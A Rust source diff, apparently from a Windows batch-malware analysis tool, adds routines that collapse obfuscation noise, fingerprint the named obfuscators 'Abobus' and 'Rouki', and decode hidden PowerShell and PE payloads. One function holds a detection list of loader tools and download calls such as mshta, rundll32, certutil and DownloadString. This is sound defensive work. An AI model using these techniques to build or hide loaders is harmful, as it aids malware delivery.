+fn summarize_repeated_windows_profile_check_blocks(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    const MIN_BLOCKS: usize = 64;
+    const MIN_BYTES: usize = 32 * 1024;
+
+    if !text.contains(":_WP_") {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = WindowsProfileCheckRun::default();
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        let trimmed = body.trim_start_matches([' ', '\t']);
+        if is_windows_profile_check_label(trimmed) {
+            pending.record(line, true);
+            continue;
+        }
+
+        if pending.blocks > 0 {
+            if trimmed.starts_with(':') {
+                changed |= flush_windows_profile_check_run(
+                    &mut out,
+                    &mut pending,
+                    env,
+                    MIN_BLOCKS,
+                    MIN_BYTES,
+                );
+                out.push_str(line);
+            } else {
+                pending.record(line, false);
+            }
+            continue;
+        }
+
+        out.push_str(line);
+    }
+    changed |= flush_windows_profile_check_run(&mut out, &mut pending, env, MIN_BLOCKS, MIN_BYTES);
+
+    changed.then_some(out)
+}
+
+#[derive(Default)]
+struct WindowsProfileCheckRun {
+    blocks: usize,
+    bytes: usize,
+    text: String,
+}
+
+impl WindowsProfileCheckRun {
+    fn record(&mut self, line: &str, starts_block: bool) {
+        if starts_block {
+            self.blocks += 1;
+        }
+        self.bytes += line.len();
+        self.text.push_str(line);
+    }
+
+    fn clear(&mut self) {
+        self.blocks = 0;
+        self.bytes = 0;
+        self.text.clear();
+    }
+}
+
+fn flush_windows_profile_check_run(
+    out: &mut String,
+    pending: &mut WindowsProfileCheckRun,
+    env: &mut Environment,
+    min_blocks: usize,
+    min_bytes: usize,
+) -> bool {
+    if pending.blocks == 0 {
+        return false;
+    }
+
+    if pending.blocks >= min_blocks && pending.bytes >= min_bytes {
+        rescue_truncated_urls(&pending.text, pending.bytes, env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.bytes as u64,
+        });
+        out.push_str("rem omitted ");
+        out.push_str(&pending.blocks.to_string());
+        out.push_str(" repeated Windows profile check blocks (");
+        out.push_str(&pending.bytes.to_string());
+        out.push_str(" bytes)\r\n");
+        pending.clear();
+        return true;
+    }
+
+    out.push_str(&pending.text);
+    pending.clear();
+    false
+}
+
+fn is_windows_profile_check_label(line: &str) -> bool {
+    let Some(rest) = line.strip_prefix(":_WP_") else {
+        return false;
+    };
+    let mut parts = rest.splitn(2, '_');
+    let Some(id) = parts.next() else {
+        return false;
+    };
+    let Some(kind) = parts.next() else {
+        return false;
+    };
+    id.len() == 4
+        && id.bytes().all(|byte| byte.is_ascii_alphanumeric())
+        && matches!(
+            kind,
+            "LogRotate"
+                | "DriveHealth"
+                | "NetCheck"
+                | "TimeZone"
+                | "TaskCheck"
+                | "WinVersion"
+                | "PSVersion"
+                | "ConfigParse"
+                | "EnvCheck"
+                | "DefenderCheck"
+                | "Firewall"
+                | "DirSetup"
+                | "SoftwareList"
+                | "DiskSpace"
+                | "WinUpdate"
+                | "EventLog"
+                | "SvcHealth"
+                | "CheckFramework"
+                | "TempAnalysis"
+                | "UserAudit"
+        )
+}
+
+fn summarize_long_double_colon_payload_lines(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_SUMMARY_BYTES: usize = 1024;
+
+    if !contains_double_colon_comment_candidate(text) {
+        return None;
+    }
+
+    let marker_prefixes = self_read_base64_marker_prefixes(text);
+    let mut changed = false;
+    let mut out = String::with_capacity(text.len().min(256 * 1024));
+    for line in text.split_inclusive('\n') {
+        let (body, eol) = split_line_ending(line);
+        let trimmed = body.trim_start_matches(['@', ' ', '\t']);
+        let leading_len = body.len() - trimmed.len();
+        let Some(payload) = trimmed.strip_prefix("::") else {
+            out.push_str(line);
+            continue;
+        };
+        if summarize_marker_prefixed_self_read_base64_line(
+            body,
+            eol,
+            trimmed.trim(),
+            &marker_prefixes,
+            env,
+            &mut out,
+        ) {
+            changed = true;
+            continue;
+        }
+        if payload.len() < MIN_SUMMARY_BYTES
+            || !(looks_like_huge_double_colon_payload_sample(payload)
+                || looks_like_double_colon_payload(payload))
+        {
+            out.push_str(line);
+            continue;
+        }
+
+        rescue_truncated_urls(payload, body.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: body.len() as u64,
+        });
+        out.push_str(&body[..leading_len]);
+        out.push_str("rem omitted ");
+        out.push_str(&payload.len().to_string());
+        out.push_str(" bytes from long :: payload line");
+        out.push_str(eol);
+        changed = true;
+    }
+
+    changed.then_some(out)
+}
+
+fn contains_double_colon_comment_candidate(text: &str) -> bool {
+    text.starts_with("::") || text.contains("\n::") || text.contains("\r\n::")
+}
+
+fn looks_like_double_colon_payload(payload: &str) -> bool {
+    let trimmed = payload.trim();
+    if trimmed.len() < 1024 || trimmed.contains("://") {
+        return false;
+    }
+    let carrier = trimmed
+        .bytes()
+        .filter(|byte| matches!(*byte, b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'+' | b'/' | b'\\' | b'=' | b'_' | b'-'))
+        .count();
+    carrier * 100 / trimmed.len() >= 90
+}
+
+fn looks_like_huge_double_colon_payload_sample(payload: &str) -> bool {
+    const MIN_HUGE_DOUBLE_COLON_PAYLOAD_BYTES: usize = 256 * 1024;
+    const SAMPLE_BYTES: usize = 4096;
+
+    let trimmed = payload.trim();
+    if trimmed.len() < MIN_HUGE_DOUBLE_COLON_PAYLOAD_BYTES {
+        return false;
+    }
+
+    let bytes = trimmed.as_bytes();
+    let mut sampled = 0usize;
+    let mut carrier = 0usize;
+    for (start, end) in huge_line_sample_ranges(bytes.len(), SAMPLE_BYTES) {
+        for byte in &bytes[start..end] {
+            sampled += 1;
+            if byte.is_ascii_whitespace() {
+                return false;
+            }
+            if matches!(
+                *byte,
+                b'A'..=b'Z'
+                    | b'a'..=b'z'
+                    | b'0'..=b'9'
+                    | b'+'
+                    | b'/'
+                    | b'\\'
+                    | b'='
+                    | b'_'
+                    | b'-'
+            ) {
+                carrier += 1;
+            }
+        }
+    }
+
+    sampled > 0 && carrier * 100 / sampled >= 90
+}
+
 fn contains_rem_comment_candidate(text: &str) -> bool {
-    text.as_bytes()
-        .windows(4)
-        .any(|w| matches!(w, [b'r' | b'R', b'e' | b'E', b'm' | b'M', b' ']))
+    let bytes = text.as_bytes();
+    let mut idx = 0usize;
+    while idx + 3 < bytes.len() {
+        if matches!(bytes[idx], b'r' | b'R')
+            && matches!(bytes[idx + 1], b'e' | b'E')
+            && matches!(bytes[idx + 2], b'm' | b'M')
+            && bytes[idx + 3] == b' '
+        {
+            return true;
+        }
+        idx += 1;
+    }
+    false
+}
+
+fn contains_caret_rem_comment_candidate(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("r^e^m ")
+        || lower.contains("r^em ")
+        || lower.contains("re^m ")
+        || lower.contains("^r^e^m ")
+}
+
+fn rem_comment_payload(line: &str) -> Option<&str> {
+    let bytes = line.as_bytes();
+    let mut idx = 0usize;
+    for expected in [b'r', b'e', b'm'] {
+        while bytes.get(idx) == Some(&b'^') {
+            idx += 1;
+        }
+        let byte = *bytes.get(idx)?;
+        if !byte.eq_ignore_ascii_case(&expected) {
+            return None;
+        }
+        idx += 1;
+    }
+    while bytes.get(idx) == Some(&b'^') {
+        idx += 1;
+    }
+    if !bytes.get(idx).is_some_and(|b| b.is_ascii_whitespace()) {
+        return None;
+    }
+    while bytes.get(idx).is_some_and(|b| b.is_ascii_whitespace()) {
+        idx += 1;
+    }
+    Some(&line[idx..])
+}
+
+fn summarize_repetitive_rem_noise_runs(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_REM_RUN_LINES: usize = 64;
+    const MIN_REM_RUN_BYTES: usize = 8192;
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending: Vec<&str> = Vec::new();
+    let mut pending_bytes = 0usize;
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_repetitive_rem_noise_line(body) {
+            pending_bytes += line.len();
+            pending.push(line);
+            continue;
+        }
+        changed |= flush_repetitive_rem_noise_run(
+            &mut out,
+            &mut pending,
+            &mut pending_bytes,
+            env,
+            MIN_REM_RUN_LINES,
+            MIN_REM_RUN_BYTES,
+        );
+        out.push_str(line);
+    }
+    changed |= flush_repetitive_rem_noise_run(
+        &mut out,
+        &mut pending,
+        &mut pending_bytes,
+        env,
+        MIN_REM_RUN_LINES,
+        MIN_REM_RUN_BYTES,
+    );
+
+    changed.then_some(out)
+}
+
+fn flush_repetitive_rem_noise_run(
+    out: &mut String,
+    pending: &mut Vec<&str>,
+    pending_bytes: &mut usize,
+    env: &mut Environment,
+    min_lines: usize,
+    min_bytes: usize,
+) -> bool {
+    if pending.is_empty() {
+        return false;
+    }
+    if pending.len() >= min_lines && *pending_bytes >= min_bytes {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: *pending_bytes as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} repetitive REM noise lines ({} bytes)\r\n",
+            pending.len(),
+            *pending_bytes
+        ));
+        pending.clear();
+        *pending_bytes = 0;
+        return true;
+    }
+
+    for line in pending.drain(..) {
+        out.push_str(line);
+    }
+    *pending_bytes = 0;
+    false
+}
+
+fn is_repetitive_rem_noise_line(line: &str) -> bool {
+    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
+    let Some(payload) = rem_comment_payload(trimmed) else {
+        return false;
+    };
+    payload.len() >= 64
+        && (is_alpha_noise_payload(payload)
+            || is_hex_rem_noise_payload(payload)
+            || is_high_entropy_rem_noise_payload(payload))
+}
+
+fn is_hex_rem_noise_payload(payload: &str) -> bool {
+    let trimmed = payload.trim();
+    trimmed.len() >= 64
+        && trimmed
+            .bytes()
+            .all(|byte| byte.is_ascii_hexdigit() || byte.is_ascii_whitespace())
+}
+
+fn is_high_entropy_rem_noise_payload(payload: &str) -> bool {
+    let trimmed = payload.trim();
+    if trimmed.len() < 64 || trimmed.contains("://") {
+        return false;
+    }
+    let mut carrier = 0usize;
+    let mut alnum = 0usize;
+    let mut distinct = [false; 256];
+    let mut distinct_count = 0usize;
+    for byte in trimmed.bytes() {
+        if byte.is_ascii_alphanumeric() {
+            alnum += 1;
+        }
+        if byte.is_ascii_alphanumeric()
+            || matches!(byte, b'+' | b'/' | b'_' | b'-' | b'.' | b',' | b'=')
+        {
+            carrier += 1;
+        }
+        let idx = byte as usize;
+        if !distinct[idx] {
+            distinct[idx] = true;
+            distinct_count += 1;
+        }
+    }
+
+    carrier * 100 >= trimmed.len() * 95 && alnum * 100 >= trimmed.len() * 55 && distinct_count >= 16
 }
 
 fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String {
@@ -10549,6 +21150,12 @@ fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String
 
     for line in text.split_inclusive('\n') {
         let (body, _) = split_line_ending(line);
+        if summarize_opaque_payload_line(body, env, &mut out) {
+            if line.ends_with('\n') {
+                out.push_str("\r\n");
+            }
+            continue;
+        }
         if summarize_inert_binary_noise_line(body, env, &mut out) {
             if line.ends_with('\n') {
                 out.push_str("\r\n");
@@ -10556,6 +21163,7 @@ fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String
             continue;
         }
         if is_binary_noise_line(body) {
+            preconsume_binary_noise_marker_set_carrier(body, env);
             pending.push_str(line);
             pending_lines += 1;
             continue;
@@ -10567,6 +21175,3121 @@ fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String
     out
 }
 
+fn suppress_residual_binary_noise_lines(text: &str, env: &mut Environment) -> Option<String> {
+    if !text.contains("binary-looking lines") {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_residual_binary_noise_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        changed |= flush_residual_binary_noise_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(line);
+    }
+    changed |= flush_residual_binary_noise_run(&mut out, &mut pending, &mut pending_lines, env);
+    changed.then_some(out)
+}
+
+fn suppress_dense_rendered_residual_binary_noise_lines(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    if !text.contains("binary-looking lines") {
+        return None;
+    }
+
+    let mut rendered_summary_lines = 0usize;
+    let mut total_omitted_lines = 0usize;
+    let mut total_omitted_bytes = 0usize;
+    for line in text.lines() {
+        if let Some((lines, bytes)) = parse_rendered_binary_noise_summary_line(line) {
+            rendered_summary_lines += 1;
+            total_omitted_lines += lines;
+            total_omitted_bytes += bytes;
+        } else if is_dense_rendered_binary_fragment_line(line) {
+            total_omitted_lines += 1;
+            total_omitted_bytes += line.len();
+        }
+    }
+
+    if rendered_summary_lines < 8 || total_omitted_lines < 64 || total_omitted_bytes < 512 {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    let mut summary_inserted = false;
+    for chunk in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(chunk);
+        let omit = parse_rendered_binary_noise_summary_line(body).is_some()
+            || is_dense_rendered_binary_fragment_line(body);
+        if omit {
+            if !summary_inserted {
+                out.push_str(&format!(
+                    "rem omitted {total_omitted_lines} rendered residual binary-looking lines ({total_omitted_bytes} bytes){ending}"
+                ));
+                summary_inserted = true;
+            }
+            rescue_truncated_urls(body, body.len(), env);
+            changed = true;
+            continue;
+        }
+        out.push_str(chunk);
+    }
+
+    if changed {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: total_omitted_bytes as u64,
+        });
+        Some(out)
+    } else {
+        None
+    }
+}
+
+fn is_dense_rendered_binary_fragment_line(line: &str) -> bool {
+    is_residual_binary_noise_line(line)
+        || is_short_rendered_binary_fragment_line(line)
+        || is_loose_control_binary_fragment_line(line)
+}
+
+fn summarize_abobus_obfuscator_scaffold_lines(text: &str, env: &mut Environment) -> Option<String> {
+    let lower_text = text.to_ascii_lowercase();
+    if !lower_text.contains("abobus-obfuscator")
+        && !lower_text.contains("rouki-obfuscator")
+        && !lower_text.contains("__author__")
+        && !lower_text.contains("__github__")
+        && !text.contains("𝧽=")
+        && !lower_text.contains("n%oined")
+    {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+    let mut changed = false;
+
+    for chunk in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(chunk);
+        if is_abobus_obfuscator_scaffold_line(body) {
+            pending.push_str(chunk);
+            pending_lines += 1;
+            continue;
+        }
+        changed |=
+            flush_abobus_obfuscator_scaffold_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(chunk);
+    }
+    changed |=
+        flush_abobus_obfuscator_scaffold_run(&mut out, &mut pending, &mut pending_lines, env);
+
+    changed.then_some(out)
+}
+
+fn flush_abobus_obfuscator_scaffold_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) -> bool {
+    if pending.is_empty() {
+        return false;
+    }
+    rescue_truncated_urls(pending, pending.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: pending.len() as u64,
+    });
+    out.push_str(&format!(
+        "rem omitted {} Abobus obfuscator scaffold lines ({} bytes)\r\n",
+        *pending_lines,
+        pending.len()
+    ));
+    pending.clear();
+    *pending_lines = 0;
+    true
+}
+
+fn is_abobus_obfuscator_scaffold_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty() || trimmed.starts_with("rem omitted ") || line_has_payload_action(trimmed)
+    {
+        return false;
+    }
+
+    let lower = trimmed.to_ascii_lowercase();
+    if lower.contains("abobus-obfuscator")
+        || lower.contains("rouki-obfuscator")
+        || lower.contains("__author__")
+        || lower.contains("__github__")
+        || lower.contains("__thub__")
+        || lower.contains("_uthor__")
+        || is_short_rouki_obfuscator_scaffold_fragment(trimmed, &lower)
+        || is_short_abobus_obfuscator_scaffold_fragment(trimmed, &lower)
+        || lower.contains("if not deed")
+        || lower.contains("if not dea")
+        || lower.contains("echo>tmp")
+        || (lower.contains("tokens=3") && lower.contains("tmp") && lower.contains("on."))
+        || lower.contains("set /a+=")
+        || (lower.contains("/a+=") && lower.contains(">nul"))
+        || (lower.contains("set b=1") && lower.contains(">nul"))
+        || (lower.contains("neq 2 exit") || lower.contains("ne%q 2 exit"))
+        || (lower.contains("n%oined") && lower.contains("@echo"))
+        || (lower.starts_with("st ") && lower.contains("script.bat"))
+        || trimmed.contains("𝧽=")
+    {
+        return true;
+    }
+
+    let commandish = trimmed
+        .trim_start_matches(|ch: char| ch.is_whitespace() || matches!(ch, '@' | ';' | '(' | ')'));
+    let commandish_lower = commandish.to_ascii_lowercase();
+    if commandish_lower.starts_with("@set ")
+        || commandish_lower.starts_with("set ")
+        || commandish_lower.starts_with("@set\"")
+        || commandish_lower.starts_with("set\"")
+    {
+        let has_long_assignment = trimmed
+            .find('=')
+            .is_some_and(|idx| trimmed.len() - idx > 48);
+        if has_long_assignment && (!trimmed.is_ascii() || trimmed.matches(' ').count() <= 4) {
+            return true;
+        }
+    }
+
+    let substr_refs = trimmed.matches(":~").count();
+    if substr_refs >= 5 {
+        return true;
+    }
+
+    let malformed_control_flow = (lower.starts_with("fo")
+        || lower.starts_with("@fo")
+        || lower.starts_with("fi")
+        || lower.starts_with("@fi")
+        || lower.starts_with("if ")
+        || lower.starts_with("@if "))
+        && (lower.contains(" do ") || lower.contains(")do") || lower.contains(" exit"));
+    malformed_control_flow
+        && (trimmed.contains("__") || substr_refs >= 2 || !has_balanced_parens(trimmed))
+}
+
+fn is_short_rouki_obfuscator_scaffold_fragment(trimmed: &str, lower: &str) -> bool {
+    let compact: String = lower.chars().filter(|ch| !ch.is_whitespace()).collect();
+    if compact.contains("chcpm437")
+        || compact == "@ech)f)f"
+        || compact == "@e%oof"
+        || compact == "eho>tmp"
+        || compact == "cl)s"
+    {
+        return true;
+    }
+
+    if lower.starts_with("if ") && lower.contains("neq 2") {
+        let compact_alpha: String = lower
+            .chars()
+            .filter(|ch| ch.is_ascii_alphabetic())
+            .collect();
+        if compact_alpha.ends_with("ext")
+            || compact_alpha.ends_with("et")
+            || compact_alpha.ends_with("exit")
+        {
+            return true;
+        }
+    }
+
+    let after_at = lower.strip_prefix('@').unwrap_or(lower);
+    if let Some(rest) = after_at.strip_prefix("set ") {
+        let name = rest.trim();
+        return !name.contains('=')
+            && name.len() >= 5
+            && name.chars().all(|ch| matches!(ch, 'i' | 'l' | '1' | '0'));
+    }
+
+    trimmed.starts_with(':') && lower.contains("rouki")
+}
+
+fn is_short_abobus_obfuscator_scaffold_fragment(_trimmed: &str, lower: &str) -> bool {
+    let compact: String = lower.chars().filter(|ch| !ch.is_whitespace()).collect();
+    if compact.contains("chcp") && compact.contains("437") && compact.contains("nul") {
+        return true;
+    }
+    if compact == "@@e)c%ff"
+        || compact == "@eooff"
+        || compact == "@eoff"
+        || compact == "@@ehooff"
+        || compact == "@echff"
+    {
+        return true;
+    }
+    let compact_alpha: String = compact
+        .chars()
+        .filter(|ch| ch.is_ascii_alphabetic())
+        .collect();
+    if compact_alpha.ends_with("eqt")
+        || compact_alpha.ends_with("eqxit")
+        || compact_alpha.ends_with("neqit")
+        || compact_alpha.ends_with("ifneit")
+        || compact == "e%xit"
+    {
+        return true;
+    }
+    if compact.len() >= 5
+        && compact.len() <= 16
+        && compact
+            .chars()
+            .all(|ch| matches!(ch, 's' | 'e' | 't' | 'i' | 'l' | '1' | '0'))
+    {
+        return true;
+    }
+
+    let commandish = lower
+        .trim_start_matches(|ch: char| ch.is_whitespace() || matches!(ch, '@' | ';' | '(' | ')'));
+    if commandish.starts_with("if ")
+        && commandish.contains("(@exit)")
+        && commandish.contains("else")
+    {
+        return commandish.contains("@echo off")
+            || commandish.contains(" echo off")
+            || commandish.contains(" eu 0")
+            || commandish.contains(" equ 0")
+            || commandish.contains(" eq");
+    }
+
+    if (commandish.contains("neq 2") || commandish.contains("ne%q 2"))
+        && (compact_alpha.ends_with("ext")
+            || compact_alpha.ends_with("et")
+            || compact_alpha.ends_with("exit"))
+    {
+        return true;
+    }
+
+    if commandish.starts_with("for ")
+        || commandish.starts_with("for/")
+        || commandish.starts_with("fi ")
+    {
+        let commandish_alpha: String = commandish
+            .chars()
+            .filter(|ch| ch.is_ascii_alphabetic())
+            .collect();
+        if commandish_alpha.contains("forlin")
+            || commandish_alpha.contains("errorlevelequ")
+            || commandish_alpha.contains("errorleveleu")
+            || commandish_alpha.contains("errorleveleit")
+            || commandish_alpha.contains("forindoif")
+            || commandish_alpha.ends_with("eqxit")
+            || (commandish_alpha.contains("dofind") && commandish_alpha.contains("lili"))
+        {
+            return true;
+        }
+    }
+
+    false
+}
+
+pub(crate) fn should_suppress_scaffold_if_not_resolved(condition: &str) -> bool {
+    let trimmed = condition.trim();
+    if trimmed.is_empty() || line_has_payload_action(trimmed) {
+        return false;
+    }
+    let fake_if = format!("if {trimmed}");
+    let fake_lower = fake_if.to_ascii_lowercase();
+    if is_short_abobus_obfuscator_scaffold_fragment(&fake_if, &fake_lower)
+        || is_short_rouki_obfuscator_scaffold_fragment(&fake_if, &fake_lower)
+    {
+        return true;
+    }
+
+    let lower = trimmed.to_ascii_lowercase();
+    lower.contains("n%oined")
+        || (lower.starts_with("deed ") && lower.ends_with(" exit"))
+        || (lower.contains("\"on.\"")
+            && lower.contains("tmp")
+            && (lower.contains("ext") || lower.contains("exit")))
+}
+
+fn line_has_payload_action(line: &str) -> bool {
+    let lower = line.to_ascii_lowercase();
+    lower.contains("://")
+        || lower.contains("downloadfile")
+        || lower.contains("downloadstring")
+        || lower.contains("invoke-webrequest")
+        || lower.contains("powershell")
+        || lower.contains("cmd")
+        || lower.contains("start")
+        || lower.contains("python")
+        || lower.contains("mshta")
+        || lower.contains("rundll32")
+        || lower.contains("regsvr32")
+        || lower.contains("certutil")
+        || lower.contains("expand-archive")
+        || lower.contains("extracttodirectory")
+}
+
+fn has_balanced_parens(text: &str) -> bool {
+    let mut depth = 0isize;
+    for ch in text.chars() {
+        match ch {
+            '(' => depth += 1,
+            ')' => {
+                depth -= 1;
+                if depth < 0 {
+                    return false;
+                }
+            }
+            _ => {}
+        }
+    }
+    depth == 0
+}
+
+fn is_loose_control_binary_fragment_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty()
+        || trimmed.len() > 2048
+        || trimmed.starts_with("rem omitted ")
+        || trimmed.contains("://")
+    {
+        return false;
+    }
+    if trimmed.bytes().any(|byte| byte < 0x20 && byte != b'\t') {
+        return true;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        let name = name.to_ascii_lowercase();
+        if crate::handlers::lookup(&name).is_some() || is_preserved_bare_command_name(&name) {
+            return false;
+        }
+    }
+    trimmed
+        .bytes()
+        .any(|byte| (byte < 0x20 && byte != b'\t') || byte >= 0x7f)
+}
+
+fn is_short_rendered_binary_fragment_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty()
+        || trimmed.len() > 40
+        || trimmed.starts_with("rem omitted ")
+        || trimmed.contains("://")
+    {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        let name = name.to_ascii_lowercase();
+        if crate::handlers::lookup(&name).is_some() || is_preserved_bare_command_name(&name) {
+            return false;
+        }
+    }
+    true
+}
+
+fn flush_residual_binary_noise_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) -> bool {
+    if pending.is_empty() {
+        return false;
+    }
+    rescue_truncated_urls(pending, pending.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: pending.len() as u64,
+    });
+    out.push_str(&format!(
+        "rem omitted {} residual binary-looking lines ({} bytes)\r\n",
+        *pending_lines,
+        pending.len()
+    ));
+    pending.clear();
+    *pending_lines = 0;
+    true
+}
+
+fn is_residual_binary_noise_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty()
+        || trimmed.starts_with("rem omitted ")
+        || trimmed.contains("://")
+        || trimmed.len() > 2048
+    {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        if crate::handlers::lookup(&name).is_some() {
+            return false;
+        }
+    }
+    let bytes = trimmed.as_bytes();
+    let suspicious = bytes
+        .iter()
+        .filter(|&&b| (b < 0x20 && b != b'\t') || b >= 0x7f)
+        .count();
+    suspicious > 0 && (suspicious >= 3 || suspicious * 20 >= bytes.len())
+}
+
+fn summarize_opaque_payload_tail_lines(text: &str, env: &mut Environment) -> Option<String> {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    let mut after_terminal = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, newline) = split_line_ending(line);
+        let omit_opaque_tail = after_terminal && is_huge_post_terminal_opaque_payload_line(body);
+        if omit_opaque_tail
+            || ((after_terminal || has_opaque_payload_marker(body)) && is_opaque_payload_line(body))
+        {
+            rescue_truncated_urls(body, body.len(), env);
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: body.len() as u64,
+            });
+            out.push_str(&format!(
+                "rem omitted {} opaque payload bytes{}",
+                body.len(),
+                newline
+            ));
+            changed = true;
+            continue;
+        }
+
+        out.push_str(line);
+        if is_tail_terminal_line(body) {
+            after_terminal = true;
+        }
+    }
+
+    changed.then_some(out)
+}
+
+fn summarize_long_opaque_base64_carrier_lines(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_OPAQUE_B64_LINE_BYTES: usize = 256 * 1024;
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, newline) = split_line_ending(line);
+        let trimmed = body.trim();
+        if is_long_opaque_base64_carrier_line(trimmed, MIN_OPAQUE_B64_LINE_BYTES) {
+            changed = true;
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: body.len() as u64,
+            });
+            out.push_str(&format!(
+                "rem omitted long opaque base64 carrier line ({} bytes){}",
+                trimmed.len(),
+                newline
+            ));
+        } else {
+            out.push_str(line);
+        }
+    }
+
+    changed.then_some(out)
+}
+
+fn is_long_opaque_base64_carrier_line(trimmed: &str, min_len: usize) -> bool {
+    if trimmed.len() < min_len || trimmed.contains("://") {
+        return false;
+    }
+    if !trimmed.as_bytes().contains(&b'\\') {
+        return false;
+    }
+    let mut base64_bytes = 0usize;
+    let mut separator_bytes = 0usize;
+    for byte in trimmed.bytes() {
+        if is_base64_carrier_byte(byte) {
+            base64_bytes += 1;
+        } else if byte == b'\\' {
+            separator_bytes += 1;
+        } else {
+            return false;
+        }
+    }
+    separator_bytes > 0
+        && base64_bytes.saturating_mul(100) / trimmed.len() >= 99
+        && separator_bytes <= 64
+}
+
+fn summarize_tail_reversed_gzip_pe_payload(text: &str, env: &mut Environment) -> Option<String> {
+    let mut lines: Vec<&str> = text.split_inclusive('\n').collect();
+    if lines.is_empty() {
+        return None;
+    }
+
+    let (idx, body, newline) = lines.iter().enumerate().rev().find_map(|(idx, line)| {
+        let (body, newline) = split_line_ending(line);
+        (!body.trim().is_empty()).then_some((idx, body, newline))
+    })?;
+    let trimmed = body.trim();
+    if trimmed.len() < 4096 || !trimmed.bytes().all(is_base64_carrier_byte) {
+        return None;
+    }
+    let pe = reversed_gzip_pe_from_base64(trimmed)?;
+
+    let leading_len = body.find(trimmed).unwrap_or(0);
+    let mut replacement = String::new();
+    replacement.push_str(&body[..leading_len]);
+    replacement.push_str(&format!(
+        "rem omitted self-tail reversed gzip PE payload ({} bytes encoded, {} bytes recovered)",
+        trimmed.len(),
+        pe.len()
+    ));
+    replacement.push_str(newline);
+    lines[idx] = replacement.as_str();
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    for line in lines {
+        out.push_str(line);
+    }
+    if push_recovered_pe_artifact(env, "tail-reversed-gzip-pe", pe.clone()) {
+        scan_binary_input_urls(&pe, env);
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: body.len() as u64,
+    });
+    Some(out)
+}
+
+fn summarize_tail_spaced_powershell_payload(text: &str, env: &mut Environment) -> Option<String> {
+    let mut lines: Vec<&str> = text.split_inclusive('\n').collect();
+    if lines.is_empty() {
+        return None;
+    }
+
+    let (idx, body, newline) = lines.iter().enumerate().rev().find_map(|(idx, line)| {
+        let (body, newline) = split_line_ending(line);
+        (!body.trim().is_empty()).then_some((idx, body, newline))
+    })?;
+    let trimmed = body.trim();
+    if trimmed.len() < 64 * 1024 || !trimmed.bytes().all(is_base64_carrier_byte) {
+        return None;
+    }
+    let decoded =
+        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, trimmed).ok()?;
+    let even_lane = decoded_spaced_ascii_even_lane(&decoded)?;
+    if !looks_like_spaced_powershell_loader(&even_lane) {
+        return None;
+    }
+    if let Some(stage) = decode_self_tail_spaced_xor_utf16_stage(&decoded) {
+        const MAX_RETAINED_SELF_TAIL_XOR_PS1_BYTES: usize = 4 * 1024 * 1024;
+        if stage.len() <= MAX_RETAINED_SELF_TAIL_XOR_PS1_BYTES {
+            // This layer is kept out of the batch buffer but remains reviewable
+            // and available to later script-stage analysis.
+            env.push_extracted_ps1_with_limit(stage, MAX_RETAINED_SELF_TAIL_XOR_PS1_BYTES);
+        } else {
+            crate::ps1_scan::scan_large_ps1_payload_bytes_fast(&stage, env);
+        }
+    }
+
+    let leading_len = body.find(trimmed).unwrap_or(0);
+    let mut replacement = String::new();
+    replacement.push_str(&body[..leading_len]);
